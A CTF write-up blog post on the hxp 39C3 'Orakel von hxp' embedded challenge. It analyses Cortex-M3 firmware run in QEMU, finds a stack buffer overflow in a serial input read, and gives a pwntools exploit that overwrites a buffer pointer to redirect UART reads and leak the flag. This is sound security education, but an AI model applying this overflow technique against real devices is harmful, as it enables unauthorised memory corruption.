+++
author = "vmpr0be"
title = "HxP 39C3 CTF - Orakel Von HxP"
date = "2025-12-29"
categories = ["ctf"]
+++

### Overview

![orakel-von-hxp banner](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/images/orakel-von-hxp.webp?raw=true)
*orakel-von-hxp challenge banner*

As you can see, the challenge author decided to include a hint: ***The flag is continuously input on UART1***, will be useful for later.

This is an embedded device challenge, the microcontroller used is [lm3s6965](https://www.ti.com/product/LM3S6965) which uses an [ARM Cortex-M3](https://de.wikipedia.org/wiki/Arm_Cortex-M3) cpu, aka ARM architecture.

Within the tarball file downloaded we find most importantly:
- The source code of the firmware located in `src/src`. 
- Compilation and emulation script at `src/start.py`.

#### Emulation

The challenge uses qemu for emulation, we can find it here in the `src/start.py` python script file:

```python
os.execvp("qemu-system-arm", [
    "qemu-system-arm",
        "-accel", "tcg,tb-size=32",
        "-M", "lm3s6965evb",
        "-kernel", "src/orakel-von-hxp_CM3.bin",
        "-nographic",
        "-monitor", "none",
        "-serial", "stdio",
        "-serial", "unix:" + str(ptd / "flag.sock") + ",server"
])
```

Let's go over the important things to qemu:
- `-M lm3s6965evb`: Emulate the EK-LM3S6965 which uses the LM3S6965 microcontroller. 
- `-kernel src/orakel-von-hxp_CM3.bin`: Use the compiled firmware located in `src/orakel-von-hxp_CM3.bin`.
- `-serial unix:flag.sock,server`: According to ChatGPT this is what makes the flag get continuously sent through the UART1 port.

#### Firmware

The firmware is pretty basic; first it sets up the system clock to keep track of time:

```C
sysctl_setclk(clk_cfg1, clk_cfg2);
    
systick_set_period_ms(1u);

systick_irq_enable();
systick_enable();
```

And then configures `UART0` for serial input (RX) and output (TX) so it can send and receive messages from the client:

```C
uart_init(uart0, UART_BAUD_115200);

// Internally called by uart_init
static void uart_enable(volatile uart_regs *uart) {
    /* Enable the port and conigure it to receive and transmit data */
    uart->CTL |= UARTCTL_UARTEN | 0x200u /* RXE */| 0x100u /* TXE */;
}
```

Finally, the main loop:

```C
const char *enlightened = "I am enlightened";

char buffer[0x80];
char* sbuf = (char*) buffer;

...

while(true) {
    serial_puts("Please ask your question as clearly as possible: ");
    serial_fgets(sbuf, 0x200, uart0);

    if(strncmp(sbuf, enlightened, 16) == 0) {
        break;
    }

    uint32_t first_int = *(uint32_t*)&buffer;

    tfp_printf("Your question was %s (0x%x). The oracle is thinking...\n", sbuf, first_int);
    
    seedRand(first_int);
    uint32_t *location = (uint32_t*)genRandLong();

    // TODO: what does qemu do if we yolo random memory?
    delay(1000);
    
    if(uart1->CTL & UARTCTL_UARTEN) {
        serial_puts("The oracle is screaming, what have you done?!?");
    } else {
        printf("The oracle answered 0x%x.\n", *location);
    }
}
```

As seen above, the main loop is pretty simple:
1. Reads user input into `sbuf` which points to `buf[0x80]`
2. If it starts with 'I am enlightened', it breaks out of the loop.
3. Prints the `sbuf` content along with the first integer of `buf[0x80]`.
4. Uses that first integer as a seed by calling `seedRand`.
5. Then generates a pseudo-random 32bit integer pointer with `genRandLong`.
6. Waits 1000ms, aka 1 second.
7. If the UART1 port is enabled then it prints a `The oracle is screaming, what have you done?!?` message, otherwise it prints the content's of the randomly generated pointer.

### Vulnerability

One vulnerability within the firmware's code is pretty obvious, a classic stack buffer overflow:

```C
char buffer[0x80];
char* sbuf = (char*)buffer;

...

serial_fgets(sbuf, 0x200, uart0);
``` 

### Exploitation

My solution used the fact that the `serial_fgets` reads data from the passed in UART port:

```C
serial_fgets(sbuf, 0x200, uart0);
```

This means if we can somehow swap `uart0` with `uart1` it will cause the `serial_fgets` function to read from `UART1` port instead of `UART0` and which results in the flag written to the buffer.

But how can we do this? well first you must know that there's 2 global variables which store the address of the IO mapped address for `UART0` and `UART1` ports:

```C
static volatile uart_regs *uart0 = (uart_regs*)0x4000c000;
static volatile uart_regs *uart1 = (uart_regs*)0x4000d000;
```

These global variables are located in SRAM (`0x20000000-0x20010000`) which is a readable and **writable** memory region as seen in the provided linker script.

```ld
MEMORY {
        FLASH (rx) : ORIGIN = 0x00000000, LENGTH = 256K
        SRAM  (rw) : ORIGIN = 0x20000000, LENGTH = 64K
}
```

Next, using the stack buffer overflow we can redirect the `sbuf` (the pointer to the `buf[0x80]`) to write the user-controlled data into `uart1` global variable. 

Before `uart0` global variable redirection to `UART1` port MMIO address:

![sram-layout-pre](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/images/hxp-sram-layout-pre.png?raw=true)<br>
*Pre-exploit SRAM layout diagram*

After the redirection:


![sram-layout-post](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/images/hxp-sram-layout-post.png?raw=true)<br>
*Post-exploit SRAM layout diagram*

Now the flag will be continuously written to `sbuf` and will be printed by:

```C
// Even though the flag corrupts uart0 and uart1 globals variables, tfp_printf won't 
// *really* use them as uart0 was cached prior to the corruption.
tfp_printf("Your question was %s (0x%x). The oracle is thinking...\n", sbuf, *buffer);
```

Here's exploit code snippet: 

```python
uart1 = 0x4000d000      # MMIO region
uart0_ptr = 0x20000000  # global variable

# the '\n' is required in order for fgets leave earlier

# redirect 'sbuf to 'uart0_ptr'
r.send(b"A"*0x8c + p32(uart0_ptr) + b"\n")
# from now on, any user input will write to 'uart0_ptr'

# replace UART0 MMIO address contained within 'uart0_ptr' with UART1's 
r.send(p32(uart1) + b"\n")

# parse received data for flag
r.recvuntil(b"hxp{")
flag = b"hxp{" + r.recvuntil(b"}")
log.info(f"Flag: {flag.decode()}")
```

The full code can be found [here]([./orakel_von_hxp/solve.py](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/solutions/orakel-von-hxp.py)

```bash
./solve.py

[+] Opening connection to 91.98.131.46 on port 1338: Done
[*] POW solved
[*] Flag: hxp{at_l3as7_y0u_f0und_s7rncmp_-_r0p_sp0ns0r3d_by_n3wl1b___*}
```

Notice that within the flag it mentions: *at least you found strncmp rop*, seems like this solution wasn't the intended one? This assumption was later confirmed:

![unintended-confirmation](https://github.com/vmpr0be/vmpr0be.github.io/blob/main/static/images/hxp_unconf.png?raw=true)<br>
*unintended solution confirmed by support*
